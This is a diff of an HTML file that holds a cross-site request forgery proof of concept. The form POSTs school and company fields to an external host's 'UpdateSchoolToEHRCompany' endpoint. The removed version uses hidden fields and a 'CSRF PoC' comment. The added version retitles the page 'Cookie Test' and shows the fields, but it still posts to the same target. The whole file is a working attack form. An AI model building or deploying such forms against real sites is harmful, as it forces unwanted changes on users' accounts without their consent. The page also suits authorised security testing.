@@ -1,14 +1,56 @@
 <html>
-  <!-- CSRF PoC  -->
+  <head>
+    <title>Cookie Test</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        text-align: center;
+        margin: 50px;
+      }
+      form {
+        display: inline-block;
+        border: 1px solid #ccc;
+        padding: 20px;
+        background-color: #f7f7f7;
+        border-radius: 5px;
+      }
+      label {
+        display: block;
+        margin-bottom: 10px;
+        font-weight: bold;
+      }
+      input[type="text"] {
+        width: 100%;
+        padding: 5px;
+        margin-bottom: 20px;
+      }
+      input[type="submit"] {
+        background-color: #007bff;
+        color: #fff;
+        padding: 10px 20px;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+      }
+      input[type="submit"]:hover {
+        background-color: #0062cc;
+      }
+    </style>
+  </head>
   <body>
-  <script>history.pushState('', '', '/')</script>
+    <h1>Cookie Test</h1>
     <form action="http://a2.test.xdf.cn/EHRCompany/UpdateSchoolToEHRCompany" method="POST">
-      <input type="hidden" name="schoolId" value="1" />
-      <input type="hidden" name="schoolName" value="222222" />
-      <input type="hidden" name="companyId" value="106" />
-      <input type="hidden" name="companyName" value=" &#140;&#151; &#172; &#173;&#166; &#160;&#161;" />
-      <input type="hidden" name="companyShortName" value="wewewe" />
-      <input type="submit" value="Submit request" />
+      <label for="schoolId">School ID:</label>
+      <input type="text" name="schoolId" value="1" />
+      <label for="schoolName">School Name:</label>
+      <input type="text" name="schoolName" value="222222" />
+      <label for="companyId">Company ID:</label>
+      <input type="text" name="companyId" value="106" />
+      <label for="companyName">Company Name:</label>
+      <input type="text" name="companyName" value=" &#140;&#151; &#172; &#173;&#166; &#160;&#161;" />
+      <label for="companyShortName">Company Short Name:</label>
+      <input type="text" name="companyShortName" value="wewewe" />
+      <input type="submit" value="Submit Request" />
     </form>
   </body>
 </html>
